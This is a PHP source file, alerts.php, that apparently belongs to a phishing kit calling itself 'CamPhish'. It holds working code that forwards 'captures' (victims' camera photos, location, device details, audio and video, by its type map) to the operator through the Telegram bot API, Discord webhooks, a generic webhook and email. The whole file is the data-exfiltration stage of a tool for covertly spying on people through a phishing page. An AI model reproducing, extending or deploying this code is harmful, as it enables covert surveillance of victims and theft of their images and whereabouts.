<?php
// ═══════════════════════════════════════════════════════════════════
//  alerts.php  — Unified multi-channel alert dispatcher
//  Handles: Telegram, Discord, Email, Generic Webhook
// ═══════════════════════════════════════════════════════════════════

$_CP_CFG = include __DIR__ . '/config.php';

// ── Telegram photo sender ──────────────────────────────────────────
function send_telegram_photo($token, $chat_id, $photo_path, $caption = '') {
    if (!$token || !$chat_id || !file_exists($photo_path)) return;
    $url  = "https://api.telegram.org/bot{$token}/sendPhoto";
    $data = [
        'chat_id' => $chat_id,
        'caption' => $caption,
        'parse_mode' => 'HTML',
        'photo'   => new CURLFile($photo_path, 'image/jpeg', basename($photo_path)),
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// ── Telegram text ──────────────────────────────────────────────────
function send_telegram_text($token, $chat_id, $text) {
    if (!$token || !$chat_id) return;
    $url  = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = http_build_query(['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML']);
    $ctx  = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $data,
        'timeout' => 5,
    ]]);
    @file_get_contents($url, false, $ctx);
}

// ── Discord webhook ────────────────────────────────────────────────
function send_discord($webhook_url, $content, $embeds = []) {
    if (!$webhook_url) return;
    $payload = json_encode(['content' => $content, 'embeds' => $embeds]);
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/json\r\nContent-Length: " . strlen($payload) . "\r\n",
        'content' => $payload,
        'timeout' => 5,
    ]]);
    @file_get_contents($webhook_url, false, $ctx);
}

// ── Generic webhook ────────────────────────────────────────────────
function send_generic_webhook($webhook_url, $payload_array) {
    if (!$webhook_url) return;
    $payload = json_encode($payload_array);
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/json\r\nContent-Length: " . strlen($payload) . "\r\n",
        'content' => $payload,
        'timeout' => 5,
    ]]);
    @file_get_contents($webhook_url, false, $ctx);
}

// ── Email ──────────────────────────────────────────────────────────
function send_email($to, $from, $subject, $body) {
    if (!$to) return;
    $headers = "From: $from\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n";
    @mail($to, $subject, $body, $headers);
}

// ═══════════════════════════════════════════════════════════════════
//  Main dispatcher — call this everywhere instead of telegram_alert()
// ═══════════════════════════════════════════════════════════════════
function dispatch_alert($type, $message, $data = [], $photo_path = null) {
    global $_CP_CFG;

    $tg_token   = $_CP_CFG['telegram_token']  ?? '';
    $tg_chat    = $_CP_CFG['telegram_chat_id'] ?? '';
    $dc_webhook = $_CP_CFG['discord_webhook'] ?? '';
    $gen_hook   = $_CP_CFG['webhook_url']     ?? '';
    $email_on   = $_CP_CFG['email_enabled']   ?? false;

    // Telegram: send photo if provided, else text
    if ($tg_token && $tg_chat) {
        if ($photo_path && file_exists($photo_path) && function_exists('curl_init')) {
            send_telegram_photo($tg_token, $tg_chat, $photo_path, strip_tags($message));
        } else {
            send_telegram_text($tg_token, $tg_chat, $message);
        }
    }

    // Discord
    if ($dc_webhook) {
        // Build a rich embed
        $color_map = [
            'visitor'  => 7506394,  // purple
            'location' => 3066993,  // green
            'photo'    => 15158332, // red
            'device'   => 16776960, // yellow
            'audio'    => 10181046, // magenta
            'video'    => 3447003,  // blue
        ];
        $color = $color_map[$type] ?? 8421504;
        $fields = [];
        foreach ($data as $k => $v) {
            $fields[] = ['name' => ucfirst(str_replace('_', ' ', $k)), 'value' => (string)$v, 'inline' => true];
        }
        $embed = [
            'title'     => "CamPhish — " . ucfirst($type),
            'description' => strip_tags($message),
            'color'     => $color,
            'fields'    => $fields,
            'timestamp' => date('c'),
        ];
        send_discord($dc_webhook, '', [$embed]);
    }

    // Generic webhook
    if ($gen_hook) {
        send_generic_webhook($gen_hook, array_merge([
            'type'    => $type,
            'message' => strip_tags($message),
            'time'    => date('c'),
        ], $data));
    }

    // Email
    if ($email_on && !empty($_CP_CFG['email_to'])) {
        $html = "<h2>CamPhish — " . ucfirst($type) . "</h2><p>" . nl2br(htmlspecialchars(strip_tags($message))) . "</p>";
        if ($data) {
            $html .= "<table border='1' cellpadding='6'><tr><th>Field</th><th>Value</th></tr>";
            foreach ($data as $k => $v) $html .= "<tr><td>$k</td><td>" . htmlspecialchars($v) . "</td></tr>";
            $html .= "</table>";
        }
        send_email(
            $_CP_CFG['email_to'],
            $_CP_CFG['email_from'] ?? 'camphish@localhost',
            $_CP_CFG['email_subject'] ?? '[CamPhish] New capture!',
            $html
        );
    }
}

// ── Back-compat shim so existing files still work ─────────────────
function telegram_alert($message) {
    dispatch_alert('generic', $message);
}
